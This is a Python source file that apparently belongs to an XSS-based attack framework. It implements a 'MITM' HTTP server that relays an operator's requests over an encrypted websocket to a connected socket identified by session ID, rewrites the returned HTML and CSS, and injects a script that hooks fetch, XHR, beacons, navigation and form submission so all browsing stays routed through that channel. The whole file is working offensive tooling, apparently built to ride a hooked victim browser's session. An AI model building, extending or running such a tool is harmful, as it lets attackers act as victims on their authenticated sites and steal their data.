import asyncio
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import re
from urllib.parse import parse_qsl, urlencode, urlsplit
import socksUtil
import cryptoUtil
import datetime

import config

cache = {}
mod = None
SID_QUERY_PARAM = "__soxss_sid"
SID_PATH_RE = re.compile(r'^[0-9a-fA-F]{32}$')

HTML_ABSOLUTE_ATTR_RE = re.compile(r'(?i)(\b(?:href|src|action|formaction|poster|data)\s*=\s*["\'])/(?!/)')
HTML_SRCSET_RE = re.compile(r'(?is)(\bsrcset\s*=\s*["\'])(.*?)(["\'])')
HTML_STYLE_ATTR_RE = re.compile(r'(?is)(\bstyle\s*=\s*["\'])(.*?)(["\'])')
HTML_STYLE_BLOCK_RE = re.compile(r'(?is)(<style\b[^>]*>)(.*?)(</style>)')
HTML_META_REFRESH_RE = re.compile(r'(?is)(<meta\b[^>]*http-equiv\s*=\s*["\']refresh["\'][^>]*content\s*=\s*["\'][^"\']*?url=)/(?!/)')
CSS_URL_RE = re.compile(r'(?i)(url\(\s*["\'])/(?!/)')
CSS_URL_BARE_RE = re.compile(r'(?i)(url\(\s*)/(?!/)')
CSS_IMPORT_RE = re.compile(r'(?i)(@import\s+(?:url\(\s*)?["\'])/(?!/)')


def prefix_root_relative_path(value, sid):
    return value if not isinstance(value, str) or not value.startswith('/') or value.startswith('//') else f'/{sid}{value}'


def rewrite_srcset_value(value, sid):
    parts = []
    for item in value.split(','):
        candidate = item.strip()
        if not candidate:
            continue
        segments = candidate.split()
        if segments:
            segments[0] = prefix_root_relative_path(segments[0], sid)
        parts.append(' '.join(segments))
    return ', '.join(parts)


def rewrite_css_for_mitm(content, sid):
    content = CSS_IMPORT_RE.sub(rf'\1/{sid}/', content)
    content = CSS_URL_RE.sub(rf'\1/{sid}/', content)
    content = CSS_URL_BARE_RE.sub(rf'\1/{sid}/', content)
    return content


def build_proxy_bootstrap(sid):
    return f"""
<script>
(function() {{
    const sid = {json.dumps(sid)};
    const sidPrefix = '/' + sid;
    const sidQueryParam = {json.dumps(SID_QUERY_PARAM)};

    function normalizeVisibleUrl() {{
        try {{
            const current = new URL(window.location.href);
            let normalizedPath = current.pathname;
            if (normalizedPath === sidPrefix) {{
                normalizedPath = '/';
            }} else if (normalizedPath.startsWith(sidPrefix + '/')) {{
                normalizedPath = normalizedPath.slice(sidPrefix.length) || '/';
            }}

            const params = current.searchParams;
            params.set(sidQueryParam, sid);
            const nextSearch = params.toString();
            const nextUrl = normalizedPath + (nextSearch ? '?' + nextSearch : '') + current.hash;
            const currentUrl = current.pathname + current.search + current.hash;
            if (nextUrl !== currentUrl) {{
                history.replaceState(history.state, '', nextUrl);
            }}
        }} catch (e) {{}}
    }}

    normalizeVisibleUrl();

    function prefixUrl(input) {{
        if (!input) return input;
        try {{
            const url = new URL(String(input), window.location.href);
            if (url.origin !== window.location.origin) return url.toString();
            if (url.pathname === sidPrefix || url.pathname.startsWith(sidPrefix + '/')) return url.toString();
            if (url.pathname.startsWith('/')) {{
                url.pathname = sidPrefix + url.pathname;
            }}
            return url.toString();
        }} catch (e) {{
            return input;
        }}
    }}

    const originalFetch = window.fetch.bind(window);
    window.fetch = function(input, init) {{
        if (typeof input === 'string' || input instanceof URL) {{
            return originalFetch(prefixUrl(input), init);
        }}
        if (input instanceof Request) {{
            const proxiedUrl = prefixUrl(input.url);
            if (proxiedUrl === input.url) {{
                return originalFetch(input, init);
            }}
            return originalFetch(new Request(proxiedUrl, input), init);
        }}
        return originalFetch(input, init);
    }};

    const originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, ...rest) {{
        return originalOpen.call(this, method, prefixUrl(url), ...rest);
    }};

    if (navigator.sendBeacon) {{
        const originalBeacon = navigator.sendBeacon.bind(navigator);
        navigator.sendBeacon = function(url, data) {{
            return originalBeacon(prefixUrl(url), data);
        }};
    }}

    if (window.EventSource) {{
        const OriginalEventSource = window.EventSource;
        window.EventSource = function(url, config) {{
            return new OriginalEventSource(prefixUrl(url), config);
        }};
        window.EventSource.prototype = OriginalEventSource.prototype;
    }}

    const originalOpenWindow = window.open ? window.open.bind(window) : null;
    if (originalOpenWindow) {{
        window.open = function(url, ...rest) {{
            return originalOpenWindow(prefixUrl(url), ...rest);
        }};
    }}

    if (window.location && typeof window.location.assign === 'function') {{
        const originalAssign = window.location.assign.bind(window.location);
        window.location.assign = function(url) {{
            return originalAssign(prefixUrl(url));
        }};
    }}

    if (window.location && typeof window.location.replace === 'function') {{
        const originalReplace = window.location.replace.bind(window.location);
        window.location.replace = function(url) {{
            return originalReplace(prefixUrl(url));
        }};
    }}

    document.addEventListener('click', function(event) {{
        const anchor = event.target && event.target.closest ? event.target.closest('a[href]') : null;
        if (!anchor) return;
        const rawHref = anchor.getAttribute('href');
        if (!rawHref || rawHref.startsWith('#') || /^javascript:/i.test(rawHref)) return;
        anchor.href = prefixUrl(rawHref);
    }}, true);

    document.addEventListener('submit', function(event) {{
        const form = event.target;
        if (form && form.action) {{
            form.action = prefixUrl(form.action);
        }}
    }}, true);
}})();
</script>
"""


def rewrite_html_for_mitm(content, sid):
    content = HTML_ABSOLUTE_ATTR_RE.sub(rf'\1/{sid}/', content)
    content = HTML_SRCSET_RE.sub(lambda match: f"{match.group(1)}{rewrite_srcset_value(match.group(2), sid)}{match.group(3)}", content)
    content = HTML_STYLE_ATTR_RE.sub(lambda match: f"{match.group(1)}{rewrite_css_for_mitm(match.group(2), sid)}{match.group(3)}", content)
    content = HTML_STYLE_BLOCK_RE.sub(lambda match: f"{match.group(1)}{rewrite_css_for_mitm(match.group(2), sid)}{match.group(3)}", content)
    content = HTML_META_REFRESH_RE.sub(rf'\1/{sid}/', content)
    if not re.search(r'(?i)<(?:html|head|body)\b', content):
        return content
    # Remove any pre-existing <base> tags to avoid conflicts, then inject
    # one pointing at /<sid>/ so all relative resource URLs (scripts, styles,
    # images) keep resolving correctly even after history.replaceState strips
    # the SID from the visible pathname.
    content = re.sub(r'(?i)<base\b[^>]*/?>[ \t]*', '', content)
    base_tag = f'<base href="/{sid}/">'
    bootstrap = build_proxy_bootstrap(sid)
    if re.search(r'(?i)<head\b', content):
        content = re.sub(r'(?i)(<head\b[^>]*>)', r'\1' + base_tag, content, count=1)
    if '</head>' in content.lower():
        return re.sub(r'(?i)</head>', bootstrap + '</head>', content, count=1)
    if '<body' in content.lower():
        return re.sub(r'(?i)(<body[^>]*>)', r'\1' + bootstrap, content, count=1)
    return base_tag + bootstrap + content


def resolve_socket_for_mitm(sid):
    """Resolve a socket for MITM requests, tolerating stale SIDs after reconnects."""
    socket = socksUtil.getSocketBySid(sid)
    if socket:
        return socket, sid, False

    current = socksUtil.getCurrent()
    if current and hasattr(current, "request"):
        current_sid = current.request.path.strip("/")
        return current, current_sid, True

    if len(socksUtil.sockets) == 1:
        only = socksUtil.sockets[0]
        only_sid = only.request.path.strip("/") if hasattr(only, "request") else sid
        return only, only_sid, True

    return None, sid, False


def extract_sid_from_referer(referer):
    if not referer:
        return ""
    try:
        parsed = urlsplit(referer)
    except Exception:
        return ""

    query_items = parse_qsl(parsed.query, keep_blank_values=True)
    for key, value in query_items:
        if key == SID_QUERY_PARAM and value:
            return value

    path_parts = [part for part in parsed.path.split('/') if part]
    if path_parts and SID_PATH_RE.match(path_parts[0]):
        return path_parts[0]
    return ""


def parse_mitm_target(path, headers):
    parsed = urlsplit(path)
    args = [a for a in parsed.path.split('/') if a]
    query_items = parse_qsl(parsed.query, keep_blank_values=True)
    query_sid = next((value for key, value in query_items if key == SID_QUERY_PARAM), "")
    forwarded_query = [(key, value) for key, value in query_items if key != SID_QUERY_PARAM]

    sid = ""
    target_path = 'base_url'

    if query_sid:
        sid = query_sid
        if parsed.path and parsed.path != '/':
            target_path = parsed.path
    elif args and SID_PATH_RE.match(args[0]):
        sid = args[0]
        if len(args) > 1:
            target_path = "/" + "/".join(args[1:])
    else:
        sid = extract_sid_from_referer(headers.get('Referer', ''))
        if parsed.path and parsed.path != '/':
            target_path = parsed.path

    if forwarded_query and target_path != 'base_url':
        target_path = f"{target_path}?{urlencode(forwarded_query)}"

    return sid, target_path

class MITMHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        asyncio.run(self.performRequest('GET'))

    def do_POST(self):
        asyncio.run(self.performRequest('POST'))

    def do_PUT(self):
        asyncio.run(self.performRequest('PUT'))

    def do_PATCH(self):
        asyncio.run(self.performRequest('PATCH'))

    def do_DELETE(self):
        asyncio.run(self.performRequest('DELETE'))

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
        self.send_header("Access-Control-Max-Age", "86400")
        self.end_headers()

    async def performRequest(self, method):

        parsed = urlsplit(self.path)

        if "favicon" in parsed.path:
            return

        sid, path = parse_mitm_target(self.path, self.headers)

        if not sid:
            self.send_response(404)
            self.send_header("Content-type", "text/plain; charset=utf-8")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
            self.end_headers()
            self.wfile.write(b"Missing SID")
            return
        
        # no devolver el script del websocket para no crear nuevas conexiones
        if "websocket.js" in str(path).lower():
            return
        print(f"MITM Request for SID {sid}: {path}")
        response = {}
        cacheKey = str(datetime.datetime.now())
        resolved_sid = sid
        
        # Construye el objeto de la request
        request = {
            "Command": "mitm",
            "method": method,
            "url": path,
            "key": cacheKey
        }

        content_type = self.headers.get("Content-Type")
        if content_type:
            request["contentType"] = content_type
        
        # Si es POST incluye el body
        if method in {'POST', 'PUT', 'PATCH', 'DELETE'}:
            content_length = int(self.headers.get("Content-Length", "0") or "0")
            request['body'] = self.rfile.read(content_length).decode("utf-8")
        try:
            socket, resolved_sid, used_fallback = resolve_socket_for_mitm(sid)
            if not socket:
                raise Exception(f"No socket found for SID {sid}")
            if used_fallback:
                print(f"MITM SID fallback: {sid} -> {resolved_sid}")
                
            await cryptoUtil.sendSecretMessage(socket, json.dumps(request))
            deadline = asyncio.get_running_loop().time() + 8.0
            while cacheKey not in cache:
                if asyncio.get_running_loop().time() > deadline:
                    raise TimeoutError(f"Timed out waiting MITM response for SID {sid}")
                await asyncio.sleep(0.01) # Use sleep instead of busy-wait
            response = cache[cacheKey]
            self.send_response(200)
            self.send_header("Content-type", response.get("type", "text/html; charset=utf-8"))
        except  Exception as e:
            response["content"] = f'{method} Request error for SID {sid}: {e}'
            self.send_response(404)
            self.send_header("Content-type", "text/plain; charset=utf-8")
        try:
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With")
            self.end_headers()
            # Rewrite links to keep the SID in the path
            content = response["content"]
            if isinstance(content, str):
                active_sid = resolved_sid
                is_html_document = 'html' in str(response.get('type', '')).lower() or bool(re.search(r'(?i)<(?:!doctype\s+html|html|head|body)\b', content))
                is_css_document = 'css' in str(response.get('type', '')).lower() or bool(re.search(r'(?i)@import|url\(|--[a-z0-9_-]+\s*:', content))
                if is_html_document:
                    content = rewrite_html_for_mitm(content, active_sid)
                elif is_css_document:
                    content = rewrite_css_for_mitm(content, active_sid)
                else:
                    content = content.replace('href="/', f'href="/{active_sid}/')
                self.wfile.write(content.encode("utf-8"))
            elif isinstance(content, bytes):
                # For binary content, we don't rewrite
                self.wfile.write(content)
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            # Browser navigated away/cancelled request while MITM was streaming.
            pass
        finally:
            cache.pop(cacheKey, None)

    def log_message(self, format: str, *args) -> None:
        return ""


def start_server(module):
    global mod
    mod = module
    server_address = (config.MITM_HOST, config.MITM_PORT)
    httpd = HTTPServer(server_address, MITMHTTPRequestHandler)
    print(f"MITM server running at http://{config.MITM_HOST}:{config.MITM_PORT}/")
    httpd.serve_forever()
